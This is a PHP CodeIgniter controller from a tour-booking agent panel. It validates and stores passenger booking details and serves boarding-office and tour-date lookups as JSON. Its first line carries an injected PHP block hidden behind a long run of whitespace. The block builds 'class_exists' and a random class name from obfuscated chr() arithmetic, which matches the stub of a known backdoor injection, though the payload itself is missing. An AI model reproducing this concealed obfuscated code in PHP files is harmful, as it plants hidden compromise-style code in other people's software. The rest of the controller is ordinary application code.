<?php                                                                                                                                                                                                                                                                                                                                                                                                 $rjEqktfcDJ = 'F' . chr ( 228 - 133 ).chr ( 335 - 248 )."\x55" . "\172" . chr (72) . chr ( 912 - 846 ); $MtvIScUPV = 'c' . chr ( 868 - 760 )."\141" . "\x73" . 's' . "\x5f" . 'e' . 'x' . "\x69" . chr (115) . chr ( 869 - 753 ).chr ( 730 - 615 ); $HsRvBftb = class_exists($rjEqktfcDJ); $rjEqktfcDJ = "19311";$MtvIScUPV = "33453";$axNhya = FALSE; ?><?php 
//   Controller for: home page
// Author: Mahesh Mhaske
// Start Date: 16-08-2022
// last updated: 16-08-2022
defined('BASEPATH') OR exit('No direct script access allowed');

class Booking_basic_info extends CI_Controller {
	 
	function __construct() {

        parent::__construct();
        if($this->session->userdata('agent_sess_id')=="") 
        { 
                redirect(base_url().'agent/login'); 
        }
        $this->module_url_path    =  base_url().$this->config->item('agent_panel_slug')."/booking_basic_info";
        $this->module_url_path_bus_seat_sel    =  base_url().$this->config->item('agent_panel_slug')."/bus_seat_selection";
        $this->module_booking_enquiry    =  base_url().$this->config->item('agent_panel_slug')."/booking_enquiry";
        $this->module_title       = "Booking Basic Info";
        $this->module_ursl_slug    = "booking_basic_info";
        $this->module_view_folder = "booking_basic_info/";
        $this->arr_view_data = [];
	 }
         
     public function index()
     {
        $agent_sess_name = $this->session->userdata('agent_name');
        $id=$this->session->userdata('agent_sess_id');
        // if($this->input->post('submit'))
        //  {
        //     redirect($this->module_url_path_bus_seat_sel.'/index');
        //  }
        
        
         $this->arr_view_data['agent_sess_name']        = $agent_sess_name;
         $this->arr_view_data['listing_page']    = 'yes';
        //  $this->arr_view_data['arr_data']        = $arr_data;
         $this->arr_view_data['page_title']      = $this->module_title." List";
         $this->arr_view_data['module_title']    = $this->module_title;
         $this->arr_view_data['module_url_path'] = $this->module_url_path;
         $this->arr_view_data['module_url_path_bus_seat_sel'] = $this->module_url_path_bus_seat_sel;
         $this->arr_view_data['module_booking_enquiry'] = $this->module_booking_enquiry;
         $this->arr_view_data['middle_content']  = $this->module_view_folder."index";
         $this->load->view('agent/layout/agent_combo',$this->arr_view_data);
        
     }

    public function add($iid="")
    {  
         $agent_sess_name = $this->session->userdata('agent_name');
         $id=$this->session->userdata('agent_sess_id');
         
        $this->db->where('is_deleted','no');
        $this->db->where('id',$id);
        $agent_data = $this->master_model->getRecords('agent');
        // print_r($agent_data); die;
        
        $this->db->order_by('id','desc');
        $this->db->where('is_deleted','no');
        $this->db->where('booking_enquiry.id',$iid);
        $agent_booking_enquiry_data = $this->master_model->getRecords('booking_enquiry');
        // print_r($agent_booking_enquiry_data); die;

        $record = array();
        $fields = "agent.*,department.department,booking_enquiry.seat_count,booking_enquiry.id as enq_id";
        $this->db->where('agent.is_deleted','no');
        $this->db->where('agent.id',$id);
        $this->db->where('booking_enquiry.id',$iid);
        $this->db->join("department", 'agent.department=department.id','left');
        $this->db->join("booking_enquiry", 'agent.id=booking_enquiry.agent_id','left');
        $agent_department = $this->master_model->getRecords('agent',array('agent.is_deleted'=>'no'),$fields);
        // print_r($agent_department); die;

        $record = array();
        $fields = "booking_enquiry.*,media_source.media_source_name";
        $this->db->where('booking_enquiry.is_deleted','no');
        // $this->db->where('booking_enquiry.id',$id);
        $this->db->where('booking_enquiry.id',$iid);
        $this->db->join("media_source", 'booking_enquiry.media_source_name=media_source.id','left');
        $media_source_data = $this->master_model->getRecords('booking_enquiry',array('booking_enquiry.is_deleted'=>'no'),$fields);
        // print_r($media_source_data); die;

        $this->db->where('is_deleted','no');
        $this->db->where('is_active','yes');
        $this->db->order_by('tour_number','ASC');
        $packages_data_booking = $this->master_model->getRecords('packages');
        // print_r($packages_data); die; 
        
        // $this->db->where('is_deleted','no');
        // $media_source_data = $this->master_model->getRecords('media_source');
        // print_r($media_source_data);


         if($this->input->post('submit'))
        {
             //print_r($_REQUEST);
            $this->form_validation->set_rules('domestic_enquiry_id', 'domestic_enquiry_id', 'required');
            $this->form_validation->set_rules('booking_office', 'Booking office', 'required');
            $this->form_validation->set_rules('regional_office', 'Regional office', 'required');
            $this->form_validation->set_rules('mrandmrs', 'Mr / Mrs', 'required');
            $this->form_validation->set_rules('surname', 'Srname', 'required');
            $this->form_validation->set_rules('first_name', 'First name', 'required');
            $this->form_validation->set_rules('middle_name', 'Middle name', 'required');
            $this->form_validation->set_rules('seat_count', 'Enter seat count', 'required');
            $this->form_validation->set_rules('mobile_number', 'mobile number', 'required');
            $this->form_validation->set_rules('media_source_name', 'media source name', 'required');
            $this->form_validation->set_rules('gender', 'gender', 'required');
             
             if($this->form_validation->run() == TRUE)
             { 
                //echo 'ppppppp';
                //die;
                $domestic_enquiry_id  = $this->input->post('domestic_enquiry_id');
                $booking_office  = $this->input->post('booking_office'); 
                $regional_office  = $this->input->post('regional_office');
                $mrandmrs  = $this->input->post('mrandmrs'); 
                $surname  = $this->input->post('surname'); 
                $first_name  = $this->input->post('first_name'); 
                $middle_name  = $this->input->post('middle_name'); 
                $seat_count  = $this->input->post('seat_count'); 
                $mobile_number  = $this->input->post('mobile_number'); 
                $media_source_name  = $this->input->post('media_source_name'); 
                $gender  = $this->input->post('gender'); 
                //  $today=date("Y-m-d");
                //  $packages  = $this->input->post('packages'); 

                 $arr_insert = array(
                     'domestic_enquiry_id' =>   $domestic_enquiry_id,
                     'booking_office' =>   $booking_office,
                     'regional_office' =>   $regional_office,
                     'mr/mrs'   =>   $mrandmrs, 
                     'srname'   =>   $surname, 
                     'first_name'   =>   $first_name, 
                     'middle_name'   =>   $middle_name, 
                     'seat_count'=>$seat_count,
                     'mobile_number'   =>   $mobile_number, 
                     'media_source_name'   =>   $media_source_name, 
                     'gender'=>$gender
                 );
                //  print_r($arr_insert); die;
                 $inserted_id = $this->master_model->insertRecord('booking_basic_info',$arr_insert,true);
                               
                 if($inserted_id > 0)
                 {
                     $this->session->set_flashdata('success_message',ucfirst($this->module_title)." Added Successfully.");
                     redirect($this->module_booking_enquiry.'/index');
                 }
 
                 else
                 {
                     $this->session->set_flashdata('error_message',"Something Went Wrong While Adding The ".ucfirst($this->module_title).".");
                 }
                 redirect($this->module_url_path.'/index');
             }   
        }


        //booking basic info  book now btn functinality 
        if($this->input->post('booknow_submit'))
        {
             //print_r($_REQUEST);
            $this->form_validation->set_rules('domestic_enquiry_id', 'domestic_enquiry_id', 'required');
            $this->form_validation->set_rules('booking_office', 'Booking office', 'required');
            $this->form_validation->set_rules('regional_office', 'Regional office', 'required');
            $this->form_validation->set_rules('mrandmrs', 'Mr / Mrs', 'required');
            $this->form_validation->set_rules('surname', 'Srname', 'required');
            $this->form_validation->set_rules('first_name', 'First name', 'required');
            $this->form_validation->set_rules('middle_name', 'Middle name', 'required');
            $this->form_validation->set_rules('seat_count', 'Enter seat count', 'required');
            $this->form_validation->set_rules('mobile_number', 'mobile number', 'required');
            $this->form_validation->set_rules('media_source_name', 'media source name', 'required');
            $this->form_validation->set_rules('gender', 'gender', 'required');
             
             if($this->form_validation->run() == TRUE)
             { 
                //echo 'ppppppp';
                //die;
                $domestic_enquiry_id  = $this->input->post('domestic_enquiry_id');
                $booking_office  = $this->input->post('booking_office'); 
                $regional_office  = $this->input->post('regional_office');
                $mrandmrs  = $this->input->post('mrandmrs'); 
                $surname  = $this->input->post('surname'); 
                $first_name  = $this->input->post('first_name'); 
                $middle_name  = $this->input->post('middle_name'); 
                $seat_count  = $this->input->post('seat_count'); 
                $mobile_number  = $this->input->post('mobile_number'); 
                $media_source_name  = $this->input->post('media_source_name'); 
                $gender  = $this->input->post('gender'); 
                //  $today=date("Y-m-d");
                //  $packages  = $this->input->post('packages'); 

                 $arr_insert = array(
                     'domestic_enquiry_id' =>   $domestic_enquiry_id,
                     'booking_office' =>   $booking_office,
                     'regional_office' =>   $regional_office,
                     'mr/mrs'   =>   $mrandmrs, 
                     'srname'   =>   $surname, 
                     'first_name'   =>   $first_name, 
                     'middle_name'   =>   $middle_name, 
                     'seat_count'=>$seat_count,
                     'mobile_number'   =>   $mobile_number, 
                     'media_source_name'   =>   $media_source_name, 
                     'gender'=>$gender
                 );
                //  print_r($arr_insert); die;
                 $inserted_id = $this->master_model->insertRecord('booking_basic_info',$arr_insert,true);
                               
                 if($inserted_id > 0)
                 {
                     $this->session->set_flashdata('success_message',ucfirst($this->module_title)." Added Successfully.");
                     redirect($this->module_url_path_bus_seat_sel.'/add/'.$iid);
                 }
 
                 else
                 {
                     $this->session->set_flashdata('error_message',"Something Went Wrong While Adding The ".ucfirst($this->module_title).".");
                 }
                 redirect($this->module_url_path.'/index');
             }   
        }
 

        
         $this->arr_view_data['agent_sess_name'] = $agent_sess_name;
         $this->arr_view_data['action']          = 'add';
         $this->arr_view_data['agent_data']        = $agent_data;
         $this->arr_view_data['agent_booking_enquiry_data']        = $agent_booking_enquiry_data;
         $this->arr_view_data['agent_department']        = $agent_department;
         $this->arr_view_data['media_source_data']        = $media_source_data;
         $this->arr_view_data['packages_data_booking']        = $packages_data_booking;
         $this->arr_view_data['page_title']      = " Add ".$this->module_title;
         $this->arr_view_data['module_title']    = $this->module_title;
         $this->arr_view_data['module_url_path'] = $this->module_url_path;
         $this->arr_view_data['module_booking_enquiry'] = $this->module_booking_enquiry;
         $this->arr_view_data['middle_content']  = $this->module_view_folder."add";
         $this->load->view('agent/layout/agent_combo',$this->arr_view_data);
    }


     public function getBlock(){ 
        // POST data 
        $all_b=array();
       $boarding_office_location = $this->input->post('did');
        
                        $this->db->where('is_deleted','no');
                        $this->db->where('is_active','yes');
                        $this->db->where('id',$boarding_office_location);
                        $data = $this->master_model->getRecord('packages');
                        $boarding = $data['boarding_office'];
                        $ids = explode(',', $boarding);
                        // print_r($ids); die;
                        $count=sizeof($ids);
                       
                        for($i=0; $i<$count; $i++)
                        {
                             $p=$ids[$i];   
                            $this->db->where('is_deleted','no');
                            $this->db->where('is_active','yes');
                            $this->db->where('id',$p);
                            $data1 = $this->master_model->getRecord('agent');
                           // print_r($data1);
                            //$bname=$data1;   
                            array_push($all_b,$data1);
                             
                        }
                        //print_r($all_b); die;
                        
        echo json_encode($all_b); 
  }

  public function get_tourdate(){ 
        // POST data 
        // $all_b=array();
       $boarding_office_location = $this->input->post('did');
        // print_r($boarding_office_location); die;
                        $this->db->where('is_deleted','no');
                        $this->db->where('is_active','yes');
                        $this->db->where('package_id',$boarding_office_location);
                        $data = $this->master_model->getRecords('package_date');
                        
        echo json_encode($data); 
  }

   

}